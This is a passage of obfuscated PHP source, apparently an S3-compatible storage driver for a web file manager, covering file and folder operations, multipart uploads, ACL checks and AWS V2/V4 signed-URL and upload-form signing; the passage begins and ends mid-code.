$É¶èÃ˜¢); return empty($æ¡üå§); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ˆÖÕç‹Â, $Ä¨™‹­ü = '', $Ş¨¢º„¯ = REPEAT_RENAME) { $ºşÇ¢’í = $this->setContent($ˆÖÕç‹Â, $Ä¨™‹­ü); if ($ºşÇ¢’í !== !1) { return $this->getPathOuter($ˆÖÕç‹Â); } return !1; } public function mkdir($îáºõİÒ, $ñ¸Â…ûæ = REPEAT_SKIP) { $Ğ›´—û =& $_SERVER[äô®•½Â]; if (empty($îáºõİÒ) && $îáºõİÒ !== $Ğ›´—û[231]) { return !1; } if ($ñ¸Â…ûæ && $this->_isFolder($îáºõİÒ)) { return $this->getPathOuter($îáºõİÒ); } $–ñİ¹×Î = $this->setContent($îáºõİÒ, $Ğ›´—û[12], !0); if ($–ñİ¹×Î !== !1) { return $this->getPathOuter($îáºõİÒ); } return !1; } public function copyFile($÷¿º’², $ÄºÏš, $‹èÆÖœò = array()) { $ÕÄŠ´•Í =& $_SERVER[äô®•½Â]; $›ñ ™Êå = $this->objectMeta($÷¿º’²); if (!$›ñ ™Êå) { return !1; } if ($›ñ ™Êå[$ÕÄŠ´•Í[79]] <= 1024 * 1024 * 200) { $Ç«ŒÏõÅ = $this->client->copyObject($this->bucket, $÷¿º’², $this->bucket, $ÄºÏš, $ÕÄŠ´•Í[232], $‹èÆÖœò); } else { $Ç«ŒÏõÅ = $this->client->multiCopyObject($this->bucket, $÷¿º’², $this->bucket, $ÄºÏš, $‹èÆÖœò); } $Ç«ŒÏõÅ = $Ç«ŒÏõÅ ? $this->getPathOuter($ÄºÏš) : !1; return $Ç«ŒÏõÅ; } public function moveFile($ÈŞ«ò­Á, $ñÉìá¿Ä) { if ($this->copyFile($ÈŞ«ò­Á, $ñÉìá¿Ä)) { $this->delFile($ÈŞ«ò­Á); return $this->getPathOuter($ñÉìá¿Ä); } return !1; } public function delFile($¿‡†áÌ) { return $this->client->deleteObject($this->bucket, $¿‡†áÌ); } public function delFolder($€˜¹ÔñÙ) { $øÀ¦¼÷³ =& $_SERVER[äô®•½Â]; if (!$this->exist($€˜¹ÔñÙ)) { return !0; } $this->listItemCache = !1; $·º»”²™ = $this->fileList($€˜¹ÔñÙ); $this->listItemCache = !0; $ÙÚ·’³ç = trim($€˜¹ÔñÙ, $øÀ¦¼÷³[8]) . $øÀ¦¼÷³[8]; if (!empty($€˜¹ÔñÙ) && $€˜¹ÔñÙ !== $øÀ¦¼÷³[231] && !in_array($ÙÚ·’³ç, $·º»”²™[$øÀ¦¼÷³[85]])) { $·º»”²™[$øÀ¦¼÷³[85]][] = $ÙÚ·’³ç; } $çèòÅÀŠ = $this->delByBatch($·º»”²™[$øÀ¦¼÷³[86]]); if (!$çèòÅÀŠ) { return !1; } $çèòÅÀŠ = $this->delByBatch($·º»”²™[$øÀ¦¼÷³[85]]); if (!$çèòÅÀŠ) { return !1; } return $this->delFile($ÙÚ·’³ç); } private function delByBatch($Øù÷Ä¿´) { foreach (array_chunk($Øù÷Ä¿´, 1000) as $îõ¼ –¸) { $ø£ó¦óë = $this->client->deleteObjects($this->bucket, $îõ¼ –¸); if (!$ø£ó¦óë) { return !1; } } return !0; } public function rename($ä‹œ¢Š, $ˆ¡ã»ñ) { return $this->renameObject($ä‹œ¢Š, $ˆ¡ã»ñ); } public function listPath($”¯´åŸ§, $¸ÑèÖŞ = false) { $—›óàÕ =& $_SERVER[äô®•½Â]; $à•Ššú¨ = $this->fileList($”¯´åŸ§, $—›óàÕ[8], !0); foreach ($à•Ššú¨[$—›óàÕ[85]] as $Ì’Ô => $ÂŠõÒ¢ö) { $à•Ššú¨[$—›óàÕ[85]][$Ì’Ô] = $this->folderInfo($ÂŠõÒ¢ö, $¸ÑèÖŞ, $ÂŠõÒ¢ö); } foreach ($à•Ššú¨[$—›óàÕ[86]] as $Ì’Ô => $ÂŠõÒ¢ö) { $à•Ššú¨[$—›óàÕ[86]][$Ì’Ô] = $this->fileInfo($ÂŠõÒ¢ö[$—›óàÕ[32]], $¸ÑèÖŞ, $ÂŠõÒ¢ö); } return $à•Ššú¨; } protected function infoChildren($ì×À÷²Ğ, &$ì´ø¬Ï) { $òˆ¸ÊØõ =& $_SERVER[äô®•½Â]; $Ï±ìä = $this->fileList($ì×À÷²Ğ, $òˆ¸ÊØõ[12], !0); $ì´ø¬Ï[$òˆ¸ÊØõ[81]] += count($Ï±ìä[$òˆ¸ÊØõ[85]]); $ì´ø¬Ï[$òˆ¸ÊØõ[80]] += count($Ï±ìä[$òˆ¸ÊØõ[86]]); foreach ($Ï±ìä[$òˆ¸ÊØõ[86]] as $‹™‡ÎÃõ) { if (!$‹™‡ÎÃõ || !$‹™‡ÎÃõ[$òˆ¸ÊØõ[79]]) { continue; } $ì´ø¬Ï[$òˆ¸ÊØõ[79]] += $‹™‡ÎÃõ[$òˆ¸ÊØõ[79]]; } } private function fileInfo($ŠÀ ïÄ, $ñÂÆ¨Šç = false, $øşÛ“†¼ = array()) { $Ô²Ø“ø =& $_SERVER[äô®•½Â]; $³ÈŞ´‚ = array($Ô²Ø“ø[32] => $this->pathThis($ŠÀ ïÄ), $Ô²Ø“ø[87] => $this->getPathOuter($ŠÀ ïÄ), $Ô²Ø“ø[33] => $Ô²Ø“ø[233], $Ô²Ø“ø[169] => $this->ext($ŠÀ ïÄ), $Ô²Ø“ø[79] => isset($øşÛ“†¼[$Ô²Ø“ø[79]]) ? $øşÛ“†¼[$Ô²Ø“ø[79]] : 0); if ($ñÂÆ¨Šç) { return $³ÈŞ´‚; } $³ÈŞ´‚[$Ô²Ø“ø[234]] = $³ÈŞ´‚[$Ô²Ø“ø[88]] = 0; $³ÈŞ´‚[$Ô²Ø“ø[235]] = $³ÈŞ´‚[$Ô²Ø“ø[236]] = !0; if (empty($øşÛ“†¼)) { $øşÛ“†¼ = $this->objectMeta($ŠÀ ïÄ); if (!$øşÛ“†¼) { return $³ÈŞ´‚; } } if (isset($øşÛ“†¼[$Ô²Ø“ø[237]]) && $øşÛ“†¼[$Ô²Ø“ø[237]]) { $³ÈŞ´‚[$Ô²Ø“ø[238]] = $øşÛ“†¼[$Ô²Ø“ø[237]]; } if (isset($øşÛ“†¼[$Ô²Ø“ø[207]])) { $³ÈŞ´‚[$Ô²Ø“ø[88]] = $øşÛ“†¼[$Ô²Ø“ø[207]]; } if (isset($øşÛ“†¼[$Ô²Ø“ø[79]])) { $³ÈŞ´‚[$Ô²Ø“ø[79]] = $øşÛ“†¼[$Ô²Ø“ø[79]]; } return $³ÈŞ´‚; } private function folderInfo($³¹à†úœ, $„øÅİåì = false, $ÓÓîõ—µ = array()) { $üÜÔ…µá =& $_SERVER[äô®•½Â]; $Ø°áô¤µ = array($üÜÔ…µá[32] => $this->pathThis($³¹à†úœ), $üÜÔ…µá[87] => $this->getPathOuter($üÜÔ…µá[8] . $³¹à†úœ), $üÜÔ…µá[33] => $üÜÔ…µá[78]); if ($„øÅİåì) { return $Ø°áô¤µ; } $Ø°áô¤µ[$üÜÔ…µá[234]] = $Ø°áô¤µ[$üÜÔ…µá[88]] = 0; $Ø°áô¤µ[$üÜÔ…µá[235]] = $Ø°áô¤µ[$üÜÔ…µá[236]] = !0; if ($³¹à†úœ == $üÜÔ…µá[12]) { return $Ø°áô¤µ; } if (empty($ÓÓîõ—µ)) { $ÓÓîõ—µ = $this->objectMeta(trim($³¹à†úœ, $üÜÔ…µá[8]) . $üÜÔ…µá[8]); } if (isset($ÓÓîõ—µ[$üÜÔ…µá[207]])) { $Ø°áô¤µ[$üÜÔ…µá[234]] = $ÓÓîõ—µ[$üÜÔ…µá[207]]; } return $Ø°áô¤µ; } private function fileList($ŸãâçÀ˜, $š÷”¿´ù = '', $ôšëÕÖ÷ = 0) { $¬ãÖ¥” =& $_SERVER[äô®•½Â]; $İÒ½¦ì× = rtrim($ŸãâçÀ˜, $¬ãÖ¥”[8]) . $¬ãÖ¥”[8]; $²Âİøñ× = $this->listObjs($İÒ½¦ì×, null, null, $š÷”¿´ù); if (!$²Âİøñ×) { return array($¬ãÖ¥”[85] => array(), $¬ãÖ¥”[86] => array()); } $ŒÈì¿¥Œ = $»’áÔÃµ = array(); foreach ($²Âİøñ×[$¬ãÖ¥”[239]] as $ÓïÅ™¢¾) { $·Ä±õ¾² = $ÓïÅ™¢¾[$¬ãÖ¥”[32]]; if ($·Ä±õ¾² == $İÒ½¦ì×) { continue; } $¦»úˆ‰ã = isset($ÓïÅ™¢¾[$¬ãÖ¥”[79]]) ? $ÓïÅ™¢¾[$¬ãÖ¥”[79]] : 0; $ñ¡ÌœÃ = $¦»úˆ‰ã == 0 && substr($·Ä±õ¾², strlen($·Ä±õ¾²) - 1, 1) == $¬ãÖ¥”[8] ? !0 : !1; $this->cacheMethodInfoSet($·Ä±õ¾², $ñ¡ÌœÃ, $ÓïÅ™¢¾); if ($ñ¡ÌœÃ) { $ŒÈì¿¥Œ[] = $·Ä±õ¾²; continue; } $»’áÔÃµ[] = $ôšëÕÖ÷ ? $ÓïÅ™¢¾ : $·Ä±õ¾²; } foreach ($²Âİøñ×[$¬ãÖ¥”[240]] as $ÓïÅ™¢¾) { $ŒÈì¿¥Œ[] = $ÓïÅ™¢¾[$¬ãÖ¥”[32]]; $this->cacheMethodInfoSet($ÓïÅ™¢¾[$¬ãÖ¥”[32]], !0); } $this->cacheMethodInfoSet($ŸãâçÀ˜, !0); return array($¬ãÖ¥”[85] => $ŒÈì¿¥Œ, $¬ãÖ¥”[86] => $»’áÔÃµ); } private function listObjs($’ˆ¡¤°, $¬ö¾á«á = null, $ä¯ú¾…ù = null, $˜‹Šíàú = null) { $çæ‹’Ğ˜ =& $_SERVER[äô®•½Â]; $’ˆ¡¤° = trim($’ˆ¡¤°, $çæ‹’Ğ˜[8]); $Ğ…®×©ğ = empty($’ˆ¡¤°) && $’ˆ¡¤° !== $çæ‹’Ğ˜[231] ? $çæ‹’Ğ˜[12] : $’ˆ¡¤° . $çæ‹’Ğ˜[8]; return $this->client->getBucket($this->bucket, $Ğ…®×©ğ, $¬ö¾á«á, $ä¯ú¾…ù, $˜‹Šíàú, !0); } public function has($¹Á‚Ìåö, $š—¸´› = false, $ªÌ´¬†« = true) { $ä¥ÍÜ’ =& $_SERVER[äô®•½Â]; $¹Á‚Ìåö = trim($¹Á‚Ìåö, $ä¥ÍÜ’[8]); $çåñà‘ù = empty($¹Á‚Ìåö) && $¹Á‚Ìåö !== $ä¥ÍÜ’[231] ? $ä¥ÍÜ’[12] : $¹Á‚Ìåö . $ä¥ÍÜ’[8]; $¤õÚ÷ÎÖ = null; $ÅåÌû¡ = 500; $ó•×œ®á = $ä¥ÍÜ’[8]; $öØÀ©‹Æ = $•–ºßÏ = array(); while (!0) { $¤¶›“µÄ = $this->listObjs($¹Á‚Ìåö, $¤õÚ÷ÎÖ, $ÅåÌû¡, $ó•×œ®á); if (!$¤¶›“µÄ) { break; } $¤õÚ÷ÎÖ = $¤¶›“µÄ[$ä¥ÍÜ’[241]]; $Ø«ùáŞì = $¤¶›“µÄ[$ä¥ÍÜ’[239]]; $í«·‘ûú = $¤¶›“µÄ[$ä¥ÍÜ’[240]]; if (empty($Ø«ùáŞì) && empty($í«·‘ûú)) { break; } if (count($Ø«ùáŞì) == 1 && $Ø«ùáŞì[0][$ä¥ÍÜ’[32]] == $çåñà‘ù) { break; } if ($š—¸´›) { if (count($Ø«ùáŞì)) { $Ø«ùáŞì = array_column($Ø«ùáŞì, $ä¥ÍÜ’[32]); $öØÀ©‹Æ = array_merge($öØÀ©‹Æ, $Ø«ùáŞì); } if (count($í«·‘ûú)) { $í«·‘ûú = array_column($í«·‘ûú, $ä¥ÍÜ’[32]); $•–ºßÏ = array_merge($•–ºßÏ, $í«·‘ûú); } if ($¤õÚ÷ÎÖ === null) { break; } continue; } if ($ªÌ´¬†«) { if (!empty($Ø«ùáŞì)) { if (count($Ø«ùáŞì) > 1 || isset($Ø«ùáŞì[0][$ä¥ÍÜ’[32]]) && $Ø«ùáŞì[0][$ä¥ÍÜ’[32]] != $çåñà‘ù) { return !0; } } } else { if (!empty($í«·‘ûú)) { return !0; } } if ($¤õÚ÷ÎÖ === null) { break; } } if ($š—¸´›) { $öØÀ©‹Æ = array_diff($öØÀ©‹Æ, array($çåñà‘ù)); $öØÀ©‹Æ = count(array_unique($öØÀ©‹Æ)); $•–ºßÏ = count(array_unique($•–ºßÏ)); return array($ä¥ÍÜ’[242] => $öØÀ©‹Æ, $ä¥ÍÜ’[243] => $•–ºßÏ); } return !1; } public function listAll($›ğå±Ó³) { $é™Ââñø =& $_SERVER[äô®•½Â]; $•º”ç¾Ÿ = $this->fileList($›ğå±Ó³, $é™Ââñø[12], !0); $Ôƒó¨â = array_to_keyvalue($•º”ç¾Ÿ[$é™Ââñø[86]], $é™Ââñø[32]); foreach ($•º”ç¾Ÿ[$é™Ââñø[85]] as $Øë¨Â»€) { if (is_string($Øë¨Â»€)) { $Ôƒó¨â[$Øë¨Â»€] = array($é™Ââñø[79] => 0); } } return $this->listAllFiles($›ğå±Ó³, $Ôƒó¨â); } public function canRead($ñø·–í½) { $Çî¹×Îé =& $_SERVER[äô®•½Â]; $‹º™´Ú’ = $this->client->getAccessControlPolicy($this->bucket, $ñø·–í½); if (!$‹º™´Ú’) { return !1; } return in_array($‹º™´Ú’, array($Çî¹×Îé[244], $Çî¹×Îé[245], $Çî¹×Îé[246])) ? !0 : !1; } public function canWrite($Á¾Øºà¸) { $ƒ—†³Ë =& $_SERVER[äô®•½Â]; $‰ëÑï ² = $this->client->getAccessControlPolicy($this->bucket, $Á¾Øºà¸); if (!$‰ëÑï ²) { return !1; } return in_array($‰ëÑï ², array($ƒ—†³Ë[244], $ƒ—†³Ë[245])) ? !0 : !1; } public function getContent($¹ö²×Ö•) { return $this->client->getObject($this->bucket, $¹ö²×Ö•); } public function setContent($¼£Ãä„ï, $ş³¬²¶° = '', $ÂìÒ¶ = false) { $ÔÑØıê =& $_SERVER[äô®•½Â]; $¼£Ãä„ï = $ÂìÒ¶ ? trim($¼£Ãä„ï, $ÔÑØıê[8]) . $ÔÑØıê[8] : $¼£Ãä„ï; $¸ø…¾£ğ = get_file_mime(get_path_ext($¼£Ãä„ï)); $îé £Ğõ = $this->client->putObject($ş³¬²¶°, $this->bucket, $¼£Ãä„ï, $ÔÑØıê[232], array(), $¸ø…¾£ğ); if (!$îé £Ğõ) { return !1; } if ($ÂìÒ¶) { return !0; } return $îé £Ğõ ? !0 : !1; } public function fileSubstr($®ÜæÊ­, $ş“ĞÜ°ñ, $ œÅÚ›é) { $ËÛü¸Â˜ = $ş“ĞÜ°ñ + $ œÅÚ›é - 1; return $this->client->getObject($this->bucket, $®ÜæÊ­, array($_SERVER[äô®•½Â][247] => "\x62\x79\164\145\163\75{$ş“ĞÜ°ñ}\55{$ËÛü¸Â˜}")); } public function upload($Ë›ñŸ …, $Ûó—Œ™, $ƒ÷¬¹ËÍ = false, $ÛÎ°Â±ğ = REPEAT_REPLACE) { $üØûÇ´ =& $_SERVER[äô®•½Â]; $£«øŒ¨ = array($üØûÇ´[248] => @md5_file($Ûó—Œ™)); $ ‹ËÅ±” = array($üØûÇ´[249] => get_file_mime(get_path_ext($Ë›ñŸ …))); if (IO::size($Ûó—Œ™) <= 1024 * 1024 * 200) { $àÀ‚æÛ² = $this->client->putObjectFile($Ûó—Œ™, $this->bucket, $Ë›ñŸ …, $üØûÇ´[232], $£«øŒ¨, $ ‹ËÅ±”); return !empty($àÀ‚æÛ²) ? $this->getPathOuter($Ë›ñŸ …) : !1; } $È…Ï¥û² = $this->client->multiUploadObject($Ûó—Œ™, $this->bucket, trim($Ë›ñŸ …, $üØûÇ´[8]), $£«øŒ¨, $ ‹ËÅ±”); return $È…Ï¥û² ? $this->getPathOuter($Ë›ñŸ …) : !1; } public function download($ÕÆäİì, $‡ùÁ¢Ø) { if (!@is_dir($this->pathFather($‡ùÁ¢Ø)) && !IO::mkdir($this->pathFather($‡ùÁ¢Ø))) { return !1; } $è÷«¨Šû = $this->client->getObject($this->bucket, $ÕÆäİì, array(), $‡ùÁ¢Ø); return $è÷«¨Šû !== !1 ? $‡ùÁ¢Ø : !1; } public function link($–«‘¢öğ, $Œô­±›ş = array()) { return $this->getPreSignedURL($–«‘¢öğ, 3600 * 12, $Œô­±›ş); } private function getPreSignedURL($àÈ÷ôŸ•, $ìşÏëË·, $àæ¥äØ¡ = array(), $üÂã•Ö³ = "\107\x45\124") { $å†êƒÓŞ =& $_SERVER[äô®•½Â]; $àÈ÷ôŸ• = trim($àÈ÷ôŸ•, $å†êƒÓŞ[8]); if ($this->signVer == $å†êƒÓŞ[250]) { return $this->client->getPreSignedV2URL($this->bucket, $àÈ÷ôŸ•, $ìşÏëË·, $üÂã•Ö³, $àæ¥äØ¡); } return $this->client->getPreSignedV4URL($this->bucket, $àÈ÷ôŸ•, $ìşÏëË·, array(), $üÂã•Ö³, $àæ¥äØ¡); } public function fileOut($ú«°ìû¨, $»…İ»¬‰ = false, $ˆº¤Ş¼Ü = false, $–…ø¢´³ = '') { $¡îÁ€ıĞ =& $_SERVER[äô®•½Â]; if ($this->isFileOutServer()) { return $this->fileOutServer($ú«°ìû¨, $»…İ»¬‰, $ˆº¤Ş¼Ü, $–…ø¢´³); } if (!$ˆº¤Ş¼Ü) { $ˆº¤Ş¼Ü = $this->pathThis($ú«°ìû¨); } $ş¦Ï¬˜¡ = get_file_mime(get_path_ext($ˆº¤Ş¼Ü)); if ($ş¦Ï¬˜¡ == $¡îÁ€ıĞ[251]) { return parent::fileOut($ú«°ìû¨, $»…İ»¬‰, $ˆº¤Ş¼Ü, $–…ø¢´³); } $ùÂ¥‹ú = array($¡îÁ€ıĞ[252] => $ş¦Ï¬˜¡); if ($»…İ»¬‰) { $ùÂ¥‹ú[$¡îÁ€ıĞ[253]] = $¡îÁ€ıĞ[254] . rawurlencode($ˆº¤Ş¼Ü); } else { } $½¬¨œ = $this->link($ú«°ìû¨, $ùÂ¥‹ú); $this->fileOutLink($½¬¨œ); } public function fileOutServer($ğ¡Æ€êí, $®ê®ƒš™ = false, $‰Â¿§ˆı = false, $‰´¶îæÙ = '') { parent::fileOut($ğ¡Æ€êí, $®ê®ƒš™, $‰Â¿§ˆı, $‰´¶îæÙ); } public function fileOutImageServer($øõ™Šóí, $à¤€Ä‘» = 250) { parent::fileOutImage($øõ™Šóí, $à¤€Ä‘»); } public function fileOutLink($Ø±ŠÙâ) { $Õ¯şí =& $_SERVER[äô®•½Â]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Õ¯şí[67], $Õ¯şí[66], $Õ¯şí[68])) && !get_url_scheme($this->endpoint) && substr($Ø±ŠÙâ, 0, 7) == $Õ¯şí[219]) { $Ø±ŠÙâ = $Õ¯şí[220] . substr($Ø±ŠÙâ, 7); } header($Õ¯şí[175] . $Ø±ŠÙâ); die; } public function hashMd5($úİè«õô, $„‹¦¼†î = '') { $Í†èÏ‘‚ = $this->objectMeta($úİè«õô); if (!$Í†èÏ‘‚) { return !1; } $„‹¦¼†î = $„‹¦¼†î ? $„‹¦¼†î : _get($Í†èÏ‘‚, $_SERVER[äô®•½Â][255]); return $„‹¦¼†î; } public function uploadFormData($„¬İ”ë, $’¥‹Óäş = 3600) { $ãëÅü³Ÿ =& $_SERVER[äô®•½Â]; if (!$this->_isClientAsync()) { $µ³³Íãş = $this->getPreSignedURL($„¬İ”ë, $’¥‹Óäş, array(), $ãëÅü³Ÿ[256]); return array($ãëÅü³Ÿ[209] => str_replace($ãëÅü³Ÿ[219], $ãëÅü³Ÿ[257], $µ³³Íãş)); } if (isset($GLOBALS[$ãëÅü³Ÿ[6]][$ãëÅü³Ÿ[92]][$ãëÅü³Ÿ[258]]) && $GLOBALS[$ãëÅü³Ÿ[6]][$ãëÅü³Ÿ[92]][$ãëÅü³Ÿ[258]] == $ãëÅü³Ÿ[231]) { return $this->uploadMultiData($„¬İ”ë, $’¥‹Óäş); } if ($this->signVer == $ãëÅü³Ÿ[250]) { return $this->uploadFormDataV2($„¬İ”ë, $’¥‹Óäş); } return $this->uploadFormDataV4($„¬İ”ë, $’¥‹Óäş); } public function uploadFormDataV2($á÷ùß˜ª, $Á¼Ü²¿® = 3600) { $êüôüæ± =& $_SERVER[äô®•½Â]; $§¨¿µÎš = $this->pathFather($á÷ùß˜ª); $ëİˆ›¡ï = $this->client->getHttpUploadPostParams($this->bucket, $§¨¿µÎš, $êüôüæ±[232], $Á¼Ü²¿®); $»şêêì£ = array_merge((array) $ëİˆ›¡ï, array($êüôüæ±[259] => $êüôüæ±[250], $êüôüæ±[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($»şêêì£[$êüôüæ±[259]]); } return $»şêêì£; } public function uploadFormDataV4($·Ÿ¶æ‹Í, $Ÿ°ºÑ¸ó = 3600) { $‡óÎ¾×Â =& $_SERVER[äô®•½Â]; $ÑÜ«½ó = $‡óÎ¾×Â[232]; $×›¹í¨Ú = $‡óÎ¾×Â[260]; $–ß†ÔßŠ = $‡óÎ¾×Â[62]; $ÂÍğİÍ† = gmdate($‡óÎ¾×Â[261]); $“©•Íï¦ = gmdate($‡óÎ¾×Â[262]); $ºç˜Æ•¤ = $‡óÎ¾×Â[263]; $÷Ú¡‰ø = $Ÿ°ºÑ¸ó . $‡óÎ¾×Â[12]; $‹õ„óÕ¯ = $‡óÎ¾×Â[264]; $©à­ˆùµ = array($this->accessKey, $“©•Íï¦, $this->region, $–ß†ÔßŠ, $ºç˜Æ•¤); $ª˜¡ ¼  = implode($‡óÎ¾×Â[8], $©à­ˆùµ); $ªÕÇ«ü = array($‡óÎ¾×Â[265] => gmdate($‡óÎ¾×Â[266], strtotime($‡óÎ¾×Â[267])), $‡óÎ¾×Â[268] => array(array($‡óÎ¾×Â[269] => $this->bucket), array($‡óÎ¾×Â[270], $‡óÎ¾×Â[271], $‡óÎ¾×Â[12]), array($‡óÎ¾×Â[270], $‡óÎ¾×Â[272], $‡óÎ¾×Â[12]), array($‡óÎ¾×Â[273] => $‹õ„óÕ¯), array($‡óÎ¾×Â[274] => $ª˜¡ ¼ ), array($‡óÎ¾×Â[275] => $×›¹í¨Ú), array($‡óÎ¾×Â[276] => $ÂÍğİÍ†), array($‡óÎ¾×Â[277] => $÷Ú¡‰ø))); $Å´’Ã = base64_encode(json_encode($ªÕÇ«ü)); $¤ó€ó = hash_hmac($‡óÎ¾×Â[278], $“©•Íï¦, $‡óÎ¾×Â[279] . $this->secret, !0); $ĞÁËûâ± = hash_hmac($‡óÎ¾×Â[278], $this->region, $¤ó€ó, !0); $’öáåï = hash_hmac($‡óÎ¾×Â[278], $–ß†ÔßŠ, $ĞÁËûâ±, !0); $Œ¥şÊŞ“ = hash_hmac($‡óÎ¾×Â[278], $ºç˜Æ•¤, $’öáåï, !0); $½ªé»·Á = hash_hmac($‡óÎ¾×Â[278], $Å´’Ã, $Œ¥şÊŞ“); $í¼ÂŠî¡ = array($‡óÎ¾×Â[249] => $‡óÎ¾×Â[12], $‡óÎ¾×Â[273] => $‹õ„óÕ¯, $‡óÎ¾×Â[280] => $Å´’Ã, $‡óÎ¾×Â[274] => $ª˜¡ ¼ , $‡óÎ¾×Â[275] => $×›¹í¨Ú, $‡óÎ¾×Â[276] => $ÂÍğİÍ†, $‡óÎ¾×Â[277] => $÷Ú¡‰ø, $‡óÎ¾×Â[281] => $½ªé»·Á, $‡óÎ¾×Â[259] => $‡óÎ¾×Â[250], $‡óÎ¾×Â[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($í¼ÂŠî¡[$‡óÎ¾×Â[259]]); } return $í¼ÂŠî¡; } public function uploadMultiData($ÉïìŸ„µ, $İ´èµÈÌ = 3600) { $îâœ‡›ı =& $_SERVER[äô®•½Â]; $‚ßæÑ÷£ = $this->signVer == $îâœ‡›ı[250] ? gmdate($îâœ‡›ı[282]) : gmdate($îâœ‡›ı[283]); $æõšÕ•¤ = array(); $«ÌĞñÖÁ = $this->client->getUploadId($this->bucket, $ÉïìŸ„µ, $æõšÕ•¤); if (!$«ÌĞñÖÁ) { return !1; } $œ„Ÿ¹ëÄ = array($îâœ‡›ı[284] => $«ÌĞñÖÁ, $îâœ‡›ı[209] => $this->getHost() . $îâœ‡›ı[8] . $this->pathEncode($ÉïìŸ„µ), $îâœ‡›ı[285] => $‚ßæÑ÷£, $îâœ‡›ı[97] => $ÉïìŸ„µ, $îâœ‡›ı[259] => $this->signVer); if ($this->_isClientAsync()) { unset($œ„Ÿ¹ëÄ[$îâœ‡›ı[259]]); } return $œ„Ÿ¹ëÄ; } public function uploadMultiAuth($ÒÕ»ãÏ, $™çŞ¸…¬ = array()) { $Ô‰›êÈš =& $_SERVER[äô®•½Â]; if ($this->signVer == $Ô‰›êÈš[250]) { if (isset($™çŞ¸…¬[$Ô‰›êÈš[286]])) { return $this->uploadPartAuthV2($ÒÕ»ãÏ, $™çŞ¸…¬); } return $this->uploadListAuthV2($ÒÕ»ãÏ, $™çŞ¸…¬); } if (isset($™çŞ¸…¬[$Ô‰›êÈš[286]])) { return $this->uploadPartAuthV4($ÒÕ»ãÏ, $™çŞ¸…¬); } return $this->uploadListAuthV4($ÒÕ»ãÏ, $™çŞ¸…¬); } public function uploadPartAuthV2($Øæ­¬ó, $Òû”øÓÉ = array()) { $¿Ã¤è»¶ =& $_SERVER[äô®•½Â]; $¾Á Ä§ = $Òû”øÓÉ[$¿Ã¤è»¶[97]]; $ÜëëŸ¡û = gmdate($¿Ã¤è»¶[282]); $óİÏÈ½Œ = array_intersect_key($Òû”øÓÉ, array_flip(array($¿Ã¤è»¶[286], $¿Ã¤è»¶[284]))); ksort($óİÏÈ½Œ); $°í²Ä…æ = $óİÏÈ½Œ ? $¿Ã¤è»¶[76] . http_build_query($óİÏÈ½Œ, null, $¿Ã¤è»¶[287], PHP_QUERY_RFC3986) : $¿Ã¤è»¶[12]; $ÑÊ”øÂÂ = array($¿Ã¤è»¶[256], $¿Ã¤è»¶[12], $¿Ã¤è»¶[123], $¿Ã¤è»¶[12], "\x78\x2d\141\x6d\x7a\x2d\144\x61\x74\145\72{$ÜëëŸ¡û}", $¿Ã¤è»¶[8] . $this->bucket . $¿Ã¤è»¶[8] . $this->pathEncode($¾Á Ä§) . $°í²Ä…æ); $“„¢´© = implode($¿Ã¤è»¶[288], $ÑÊ”øÂÂ); $¢––³“– = $this->client->__getSignature($“„¢´©); return array($¿Ã¤è»¶[289] => $¢––³“–, $¿Ã¤è»¶[285] => $ÜëëŸ¡û); } public function uploadListAuthV2($¾íÈ”ûÏ, $¥«àŒÖ… = array()) { $½ìØöà† =& $_SERVER[äô®•½Â]; $šŠßñÓ¡ = $¥«àŒÖ…[$½ìØöà†[97]]; $³ğíòâÀ = $¥«àŒÖ…[$½ìØöà†[284]]; $Íı©Ø¡ˆ = $this->client->listParts($this->bucket, $šŠßñÓ¡, $³ğíòâÀ); if (!$Íı©Ø¡ˆ) { return !1; } $ÎÍæñ‚ç = gmdate($½ìØöà†[282]); $³Ö£Éêã = $½ìØöà†[290] . $³ğíòâÀ; $¯•µíÜ‚ = array($½ìØöà†[291], $½ìØöà†[12], $½ìØöà†[123], $½ìØöà†[12], "\x78\x2d\141\x6d\x7a\55\x64\x61\164\x65\72{$ÎÍæñ‚ç}", $½ìØöà†[8] . $this->bucket . $½ìØöà†[8] . $this->pathEncode($šŠßñÓ¡) . $³Ö£Éêã); $ñĞ©„ò‡ = implode($½ìØöà†[288], $¯•µíÜ‚); $÷½şÅÄŠ = $this->client->__getSignature($ñĞ©„ò‡); return array($½ìØöà†[289] => $÷½şÅÄŠ, $½ìØöà†[285] => $ÎÍæñ‚ç, $½ìØöà†[292] => $Íı©Ø¡ˆ); } public function uploadPartAuthV4($ì“şìèë, $×Óìö³ê = array()) { $‰¢ù‹¦³ =& $_SERVER[äô®•½Â]; $›ÛÍû‰³ = $×Óìö³ê[$‰¢ù‹¦³[97]]; $ªÆµæÖÂ = array($‰¢ù‹¦³[276] => gmdate($‰¢ù‹¦³[283]), $‰¢ù‹¦³[293] => _get($×Óìö³ê, $‰¢ù‹¦³[294], hash($‰¢ù‹¦³[278], $‰¢ù‹¦³[12]))); $‡·“ÂÒÉ = explode($‰¢ù‹¦³[211], $this->getHost()); $²ÍŠ’à• = array($‰¢ù‹¦³[295] => $‡·“ÂÒÉ[1], $‰¢ù‹¦³[296] => $‰¢ù‹¦³[12], $‰¢ù‹¦³[249] => $‰¢ù‹¦³[123], $‰¢ù‹¦³[297] => $×Óìö³ê[$‰¢ù‹¦³[79]]); $¡±íïÖ¨ = $‰¢ù‹¦³[256]; $ë£¿ãØ = $‰¢ù‹¦³[8] . $this->pathEncode($›ÛÍû‰³); $Æ¼ı‡ÂÂ = array_intersect_key($×Óìö³ê, array_flip(array($‰¢ù‹¦³[286], $‰¢ù‹¦³[284]))); $˜·ßœËí = $this->client->__getSignatureV4($ªÆµæÖÂ, $²ÍŠ’à•, $¡±íïÖ¨, $ë£¿ãØ, $Æ¼ı‡ÂÂ); return array($‰¢ù‹¦³[289] => $˜·ßœËí, $‰¢ù‹¦³[293] => $ªÆµæÖÂ[$‰¢ù‹¦³[293]], $‰¢ù‹¦³[285] => $ªÆµæÖÂ[$‰¢ù‹¦³[276]]); } public function uploadListAuthV4($íÇ¡í®, $Ş“†ù = array()) { $¥ôµ©Ï =& $_SERVER[äô®•½Â]; $›ƒ²„Ë = $Ş“†ù[$¥ôµ©Ï[97]]; $ŸŞŸâÀ» = $Ş“†ù[$¥ôµ©Ï[284]]; $Ññ£‹Ñ¥ = $this->client->listParts($this->bucket, 